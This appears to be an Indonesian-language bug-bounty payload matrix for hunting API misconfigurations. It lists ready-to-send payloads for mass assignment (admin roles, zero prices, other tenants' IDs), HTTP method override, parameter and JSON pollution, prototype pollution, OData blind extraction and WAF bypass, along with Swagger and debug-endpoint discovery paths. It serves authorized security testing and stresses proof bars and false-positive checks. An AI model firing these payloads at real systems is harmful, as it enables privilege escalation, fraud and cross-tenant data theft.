# API Misconfig Variant Matrix — mass-assignment, verb/param pollution, prototype pollution, OData, OpenAPI exposure

Katalog eksekusi untuk `hunt-api-misconfig`. Setiap varian = payload + detect-signal + proof bar.
Additive-only: kasus spesifik (DRF, Supabase/PostgREST, Plotly Dash, runtime recon) tetap di
`references/` masing-masing; dokumen ini matriks terpusat untuk sweep cepat.

---

## A. Mass Assignment (over-posting) — bila update endpoint menerima field lebih dari UI

**Detect:** `POST/PUT/PATCH` object sendiri, tambahkan field privileged → cek apakah dipersist EN
bukan di-drop/diignore.

| Field privilege | Payload example | Signal |
|---|---|---|
| Role/permission | `{"email":"me@e.com","role":"admin","is_admin":true}` | role berubah → lihat `/api/me` |
| Tenant/org | `{"org_id":1234}` / `{"tenant":"B"}` | akses resource tenant lain |
| Entitlement | `{"plan":"enterprise","premium":true,"trial_ends":null}` | bucket/quota jadi premium |
| Financial | `{"price":0,"amount":0,"balance":99999}` | saldo/amount naik |
| Verification flag | `{"verified":true,"email_verified":true,"banned":false}` | akun jadi verified tanpa flow |

**Proof bar:** field tak-seharusnya **terpersist** (baca balik endpoint) — bukan respon 200 kosong
(200 + field diabaikan = difilter = BUKAN temuan; lesson Survicate).

**Negative control (wajib):** update field yang jelas tak boleh diubah (`subscription_*`), pastikan
BETUL diabaikan. Kalau hanya 200 tapi tidak persist = filtered, skip.

---

## B. Verb tampering & method override

Backend sering pasang authz hanya di satu verb.

| Varian | Payload | Signal |
|---|---|---|
| Verb swap | `GET /admin/x` → `POST /admin/x` | respon beda / data keluar |
| `X-HTTP-Method-Override` | `X-HTTP-Method-Override: DELETE` + `POST` | DELETE dieksekusi |
| `_method` param | `?_method=DELETE` (Rails/Laravel) | DELETE/PUT dipaksa |
| `X-HTTP-Method` | `X-HTTP-Method: PUT` (Google/gateway) | verb di-override |

**Proof bar:** efek nyata (resource terhapus/terubah), bukan cuma beda status. ⚠️ 405 = jebakan:
kalau semua verb 405, authz ada di layer lain — bukan temuan.

---

## C. Parameter Pollution (HPP / SPP / JSON pollution)

### C1. HTTP Parameter Pollution (HPP)
```
?id=111&id=victim         # duplicate key — backend ambil yang mana?
```
Different stacks: PHP→last, ASP.NET→comma-join, JSP→first. Fingerprint stack dulu lalu sizeof-dupe.

### C2. JSON object pollution (duplicate key / array wrap)
```json
{"id":111,"id":"victim"}
{"id":[111,"victim"]}
{"id":{"$ne":null}}       // kalau query builder leak
```

### C3. Server-Side Parameter Pollution (SSPP) — URL/query dibangun backend
```
GET /api/user?first_name=hacker&last_name=x  →  backend fetch internal?user=hacker&... 
tambahkan &user_id=victim  atau  &admin=true  →  param bocor ke internal call
```
**Detect:** fuzz param internal (`user_id`, `admin`, `role`, `limit`, `fields`) yang disisipkan.

**Proof bar:** data/aksi lintas-batas nyata (baca balik).

---

## D. Prototype Pollution (JavaScript sink) — use `hunt-nodejs` detail

| Varian | Payload | Signal |
|---|---|---|
| `__proto__` | `{"__proto__":{"isAdmin":true}}` | state ternodai → dump `Object.prototype` |
| `constructor.prototype` | `{"constructor":{"prototype":{"x":1}}}` | sama |
| `__proto__.polluted` via query | `?__proto__[polluted]=yes` | muncul di Object.prototype |
| urlencoded | `__proto__[admin]=true` | — |

**Proof bar:** prototype BENAR ternodai (cek `({}).admin === true` via side-data/leak), bukan cuma
payload diterima. Chain ke RCE/XSS/DoS.

---

## E. OData `$filter/$select/$expand/$batch` bypass — WAF-blacklist dodge

| Attack class | Payload | Signal |
|---|---|---|
| Boolean blind | `$filter=startswith(Name,'a')` | time/size diff → ekstrak huruf |
| Column disclosure | `$orderby=<secret_col>` / `$select=*` | column name/error leak |
| `$batch` | multipart/mixed — WAF cek per-request, batch bypass | sub-request lolos WAF |
| Encoded op | `$filter=Name eq 'x'` via `%24filter=` / non-canonical | keyword-blacklist bypass |
| OData→SQLi | `$filter=tolower(Name) eq 'x'` (lib pass raw) | SQL err / time blind |

**Proof bar:** data kolom lain / blind ekstrak nyata terkonfirmasi.

---

## F. OpenAPI/Swagger/NSwag exposure — spec menggandakan surface

Discovery paths (cross-ref `web2-recon`):
```
/swagger/v1/swagger.json  /swagger.json  /api-docs  /openapi.json  /v3/api-docs
/swagger-resources        /actuator/mappings  /api/swagger/v1/swagger.json
```

**Attack chain (dari SKILL.md "E"):**
1. Spec tanpa `securitySchemes` → route group "private" sering **ungated** → call langsung tanpa kredensial.
2. ⚠️ **Rule (lesson):** sebelum lapor "endpoint tanpa auth = bug":
   - baca `security` + `required:false` di spec — kalau memang `required:false`, itu public-by-design;
   - panggil route front-end resmi TANPA kredensial — DATA SAMA = public, STOP;
   - 405 = jebakan.

**Proof bar:** endpoint dengan data nyata yang UI-nya juga **memang butuh** auth, tapi API
tanpa auth mengembalikan data yang SAMA (dan bukan public-by-design).

---

## G. Debug/verbose endpoints & response over-fetch

| Varian | Probe |
|---|---|
| Verbose error | kirim field invalid → error leak stack/internal path/SQL |
| Debug routes | `/debug`, `/trace`, `/console`, `/actuator/env`, `/internal/*`, `/beta/*` |
| Over-fetch | bandingkan field di response vs yang UI render → field lebih (ID internal, role, secret) |

**Proof bar:** field/data yang seharusnya tidak diekspos (bukan sekadar "banyak field").

---

## Priority order (sweep cepat per target)

1. **OpenAPI/Swagger exposure** (F) — satu GET bisa buka seluruh surface.
2. **Mass assignment** (A) — paling sering ada di update/profil/pricing.
3. **Method override / verb tampering** (B) — authz cuma satu verb.
4. **HPP/SPP** (C) — dupe key + param internal.
5. **Prototype pollution** (D) — hanya JS stack, tapi → RCE.
6. **OData bypass** (E) — hanya kalau fingerprint OData/sebagian MS stack.
7. **Over-fetch + debug** (G) — murah, sering jadi pendukung temuan.

Setiap temuan: revalidasi ≥3×, bukti lintas-batas nyata, jangan klaim dari 200/400 kosong.